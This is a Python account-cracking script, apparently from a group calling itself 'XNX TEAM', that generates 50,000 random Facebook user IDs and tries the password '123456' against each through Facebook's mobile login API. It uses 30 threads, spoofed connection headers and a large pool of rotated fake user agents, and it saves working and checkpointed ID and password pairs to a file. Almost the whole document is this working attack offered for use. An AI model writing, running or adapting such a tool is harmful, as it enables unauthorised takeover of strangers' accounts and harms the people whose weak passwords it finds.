#Daily Update Will come
#🐸🐸 Open source
#update no : 1
#XNX TEAM
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m' 
import os
try:
	import requests
except ImportError:
	os.system("pip install requests") 
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures") 
import os,sys,time,requests,random,platform,base64,subprocess
from concurrent.futures import ThreadPoolExecutor
ugen = ['Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002X846O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4702.74 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002W761D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4321.81 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002D37Y) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4520.141 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002X345N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4457.108 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002Z827A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4803.76 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002V847W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4705.111 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002N341T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4827.121 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Y791J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4376.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Z333A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4768.107 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002G873P) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4348.54 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002R697H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4680.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Z665C) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4693.128 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002E853Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4775.141 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002Z99L) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4735.47 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002F325V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4867.61 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002K664M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4665.45 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002W549Q) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.390.0.4446.76 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002S207Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4412.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002V545M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4553.82 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002F950N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.374.0.4777.137 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002E740D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4496.100 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002U973T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4472.139 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002E710O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4846.93 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002H294B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4476.53 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002U697M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4607.142 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002O992K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4346.100 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002U857V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4559.57 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002X311G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4777.77 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002W175A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4709.88 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002N155W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4623.139 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002B288K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4694.64 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002B710R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4219.63 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002A750V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4278.80 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002H922H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.373.0.4738.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002O545R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4719.132 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002H585M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4275.87 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002C636P) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4265.75 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002X278G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4599.104 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002R158F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4571.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002V851O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.383.0.4593.48 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002D265G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4332.62 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002J10J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4878.134 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P257Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4388.134 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P304S) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4445.80 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002B688U) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.373.0.4877.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002B85A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.399.0.4413.86 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002Z113D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.393.0.4592.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002I712L) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4614.109 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002J811B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4849.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Q887W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4435.50 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002H570O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4465.79 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002J951A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4707.130 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002U117J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.390.0.4419.147 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002T725B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4735.132 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002C293I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.394.0.4773.81 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002P511Y) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4428.122 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002G568D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4419.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002C157R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4709.83 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P947F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4310.101 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002J797K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4884.55 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002N124D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4254.116 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002C973I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4796.128 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002V77Q) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4519.106 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002U898D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4281.51 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002J944M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.376.0.4420.135 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002J108X) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4324.107 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002I186B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.376.0.4895.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002M879A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4616.59 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002J491N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4565.65 Mobile Safari/537.36 Sleipnir/3.5.28']
logo = ''' Project 2009🐸
 Daily Update useragent🐸
 75% CP ID will just now login🐸
 Total Ua : 69 🐸'''
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		self.fbtua()
		print (logo)			
	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = 50000
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			os.system('xdg-open https://github.com/')
			os.system('clear')
			print(logo) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				listpass = '123456'
				if len(listpass)<=5:
					exit()
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(ugen)	
		sys.stdout.write(
			"\r\r %s\033[92;1m[2K9] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [XNX_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [XNX_CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
 
		self.loop +=1  
try:Main()
except Exception as e:exit(str(e))